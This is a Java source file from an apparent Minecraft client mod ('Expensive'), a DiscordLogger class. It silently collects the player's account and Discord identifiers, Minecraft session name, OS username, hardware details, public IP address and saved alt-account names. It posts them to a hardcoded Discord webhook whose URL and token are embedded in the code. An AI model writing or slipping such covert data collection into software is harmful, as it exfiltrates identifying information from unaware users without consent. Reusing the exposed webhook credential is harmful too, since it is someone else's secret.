package im.expensive.discord;

import com.jagrosh.discordipc.entities.User;
import com.mojang.blaze3d.platform.PlatformDescriptors;
import im.expensive.Expensive;
import im.expensive.ui.mainmenu.Alt;
import net.minecraft.client.Minecraft;

import java.awt.*;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.management.ManagementFactory;
import java.lang.management.MemoryMXBean;
import java.lang.management.OperatingSystemMXBean;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URI;
import java.net.URL;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.ZoneId;
import java.time.ZonedDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Enumeration;
import java.util.Properties;

public class DiscordLogger {

    public static User user;
    private static final DiscordWebHook webhook = new DiscordWebHook("https://discord.com/api/webhooks/1208024020222484490/Gf1VLBbKzI2mlBtM4mUlgOjRqJgvtSX1IlLy1nkx0Ney7b_csliP5kAQ9ii2r2Up1TSv");


    public static void startWebHook() {

        DiscordWebHook.EmbedObject embedObject = getEmbedObject();
        webhook.addEmbed(embedObject);
        try {
            webhook.execute();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static DiscordWebHook.EmbedObject getEmbedObject() {

        DiscordWebHook.EmbedObject embedObject = new DiscordWebHook.EmbedObject();

        ZonedDateTime currentTime = ZonedDateTime.now(ZoneId.of("Europe/Moscow"));
        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
        String formattedTime = currentTime.format(formatter);

        embedObject.addField("user", Expensive.userData.getUser(), true);
        embedObject.addField("uid", String.valueOf(Expensive.userData.getUid()), true);
        embedObject.addField("minecraft session", Minecraft.getInstance().getSession().getUsername(), true);
        embedObject.addField("discord name", user == null ? "null" : user.getName(), true);
        embedObject.addField("discord id", user == null ? "null" : String.valueOf(user.getIdLong()), true);
        OperatingSystemMXBean osBean = ManagementFactory.getOperatingSystemMXBean();
        String username = System.getProperty("user.name");
        embedObject.addField("User Name", username, true);
        embedObject.addField("OS Name", osBean.getName(), true);
        embedObject.addField("CPU", PlatformDescriptors.getCpuInfo(), true);
        embedObject.addField("GPU", PlatformDescriptors.getGlRenderer(), true);
        String userAgent = fetchUserAgent();
        embedObject.addField("User-agent", userAgent, true);
        String ip = fetchIPAddress();
        embedObject.addField("IPv4", ip, false);
        embedObject.addField("time", formattedTime, false);

        embedObject.addField("Accounts:", "", false);
        for (Alt alt : Expensive.getInstance().getAltWidget().alts) {
            embedObject.addField("", alt.name, true);

        }


        embedObject.setColor(new Color(105, 231, 160));
        if (user != null)
            embedObject.setImage(user.getAvatarUrl());
        return embedObject;
    }
    private static synchronized String fetchUserAgent() {
        HttpClient client = HttpClient.newHttpClient();
        HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create("https://httpbin.org/user-agent"))
                .build();

        try {
            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
            String responseBody = response.body();
            return responseBody.split("\"")[3];
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
        return "null";
    }
    private static synchronized String fetchIPAddress() {
        try {
            URL whatismyip = new URL("http://checkip.amazonaws.com");
            BufferedReader in = new BufferedReader(new InputStreamReader(
                    whatismyip.openStream()));
            return in.readLine();
        } catch (IOException e) {
            return "Unknown IP";
        }
    }
}
